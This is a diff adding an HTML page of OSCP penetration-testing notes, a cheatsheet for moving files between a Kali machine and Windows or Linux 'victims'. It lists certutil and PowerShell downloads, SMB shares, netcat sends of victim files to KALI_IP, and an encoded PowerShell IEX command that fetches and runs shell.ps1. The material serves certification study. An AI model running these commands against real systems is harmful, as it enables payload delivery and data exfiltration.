@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>File Transfer - OSCP Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <nav>
+        <a href="index.html">Home</a>
+
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+
+        <a href="windows_privesc.html">Windows PrivEsc</a>
+        <a href="linux-privesc.html">Linux Privesc</a>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+    </nav>
+
+    <div class="container">
+
+        <h1>File Transfer Cheatsheet (Kali ↔ Windows / Linux)</h1>
+
+        <div class="section">
+            <div class="section-header">1. Kali → Windows (HTTP Method)</div>
+            <div class="section-content">
+
+                <p><strong>On Kali:</strong></p>
+
+                <pre><code>python3 -m http.server 80</code></pre>
+
+                <p><strong>On Windows:</strong></p>
+
+                <pre><code>certutil -urlcache -split -f http://KALI_IP/file.exe file.exe</code></pre>
+
+                <pre><code>iwr http://KALI_IP/file.exe -OutFile file.exe</code></pre>
+
+                <pre><code>powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file.exe','file.exe')"</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">2. Kali → Windows (SMB Method)</div>
+            <div class="section-content">
+
+                <p><strong>On Kali:</strong></p>
+
+                <pre><code>impacket-smbserver share . -smb2support -username kali -password kali</code></pre>
+
+                <p><strong>On Windows:</strong></p>
+
+                <pre><code>net use \\KALI_IP\share /user:kali kali
+copy file.exe \\KALI_IP\share\</code></pre>
+
+                Or download from share:
+
+                <pre><code>copy \\KALI_IP\share\file.exe file.exe</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">3. Windows → Kali (Netcat Method)</div>
+            <div class="section-content">
+
+                <p><strong>On Kali:</strong></p>
+
+                <pre><code>nc -lvnp 9001 > file.exe</code></pre>
+
+                <p><strong>On Windows:</strong></p>
+
+                <pre><code>nc KALI_IP 9001 &lt; file.exe</code></pre>
+
+                If no nc on Windows:
+
+                <pre><code>type file.exe | nc KALI_IP 9001</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">4. Kali → Linux (HTTP Method)</div>
+            <div class="section-content">
+
+                <p><strong>On Kali:</strong></p>
+
+                <pre><code>python3 -m http.server 80</code></pre>
+
+                <p><strong>On Linux victim:</strong></p>
+
+                <pre><code>wget http://KALI_IP/file.sh
+curl http://KALI_IP/file.sh -o file.sh</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">5. Linux → Kali (Netcat Method)</div>
+            <div class="section-content">
+
+                <p><strong>On Kali:</strong></p>
+
+                <pre><code>nc -lvnp 9001 > file.txt</code></pre>
+
+                <p><strong>On Linux victim:</strong></p>
+
+                <pre><code>nc KALI_IP 9001 &lt; file.txt</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">6. SCP (If SSH Available)</div>
+            <div class="section-content">
+
+                <p><strong>From Kali to Linux:</strong></p>
+
+                <pre><code>scp file user@TARGET_IP:/tmp/</code></pre>
+
+                <p><strong>From Linux to Kali:</strong></p>
+
+                <pre><code>scp user@TARGET_IP:/tmp/file .</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">7. Base64 Transfer (When Nothing Works)</div>
+            <div class="section-content">
+
+                <p><strong>On victim:</strong></p>
+
+                <pre><code>base64 file.exe</code></pre>
+
+                Copy output manually.
+
+                <p><strong>On Kali:</strong></p>
+
+                <pre><code>base64 -d file.b64 > file.exe</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">8. PowerShell Encoded Download</div>
+            <div class="section-content">
+
+                <pre><code>powershell -enc BASE64COMMAND</code></pre>
+
+                Generate encoded command:
+
+                <pre><code>echo -n "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">9. FTP Quick Method</div>
+            <div class="section-content">
+
+                <p><strong>On Kali:</strong></p>
+
+                <pre><code>sudo python3 -m pyftpdlib -p 21</code></pre>
+
+                <p><strong>On victim:</strong></p>
+
+                <pre><code>ftp KALI_IP</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">10. OSCP Mental Quick Picks</div>
+            <div class="section-content">
+
+                <ul>
+                    <li>Have PowerShell? → iwr</li>
+                    <li>No PowerShell? → certutil</li>
+                    <li>Linux? → wget</li>
+                    <li>No tools? → base64</li>
+                    <li>Need exfiltration? → netcat</li>
+                    <li>SMB open? → impacket-smbserver</li>
+                </ul>
+
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        document.querySelectorAll(".section-header").forEach(h => {
+            h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+        })
+    </script>
+
+</body>
+
+</html>
